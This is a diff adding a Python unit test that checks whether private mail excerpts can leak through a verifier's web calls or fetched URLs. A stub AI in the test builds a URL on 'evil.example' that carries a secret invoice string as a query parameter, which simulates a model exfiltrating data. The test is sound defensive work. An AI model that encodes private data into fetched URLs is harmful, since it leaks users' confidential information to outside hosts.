@@ -213,6 +213,23 @@ class VerifyTests(unittest.TestCase):
         self.assertTrue(ai.calls[0][2]["web"])
 
 
+    def test_private_excerpts_never_reach_the_web_or_a_fetched_url(self):
+        """MEETONTRACK-128: a model that echoes what it saw cannot carry a private excerpt out."""
+        secret = "invoice 4471 for Acme"
+        kb = [{"title": "mail", "location": "gmail:1", "text": f"Private: {secret}"}]
+
+        class Echo(StubAI):
+            def run(self, purpose, prompt, ticket=None, **options):
+                self.calls.append((purpose, prompt, options))
+                leak = "https://evil.example/" + ("x?d=" + secret if secret in prompt else "page")
+                return Reply(json.dumps({"verdict": "confirmed", "sources": [{"url": leak, "quote": "q"}]}), "m", "")
+
+        ai, fetched = Echo("codex", ""), []
+        verify(dict(CLAIM), ai=ai, knowledge=lambda row: kb, fetch=lambda url: fetched.append(url) or (url, None))
+        self.assertEqual([options["web"] for _, _, options in ai.calls], [False, True])
+        self.assertNotIn(secret, ai.calls[1][1])
+        self.assertEqual(fetched, ["https://evil.example/page"])
+
 class StoreTests(unittest.TestCase):
     def test_near_identical_claims_are_kept_once_per_meeting(self):
         with tempfile.TemporaryDirectory() as directory:
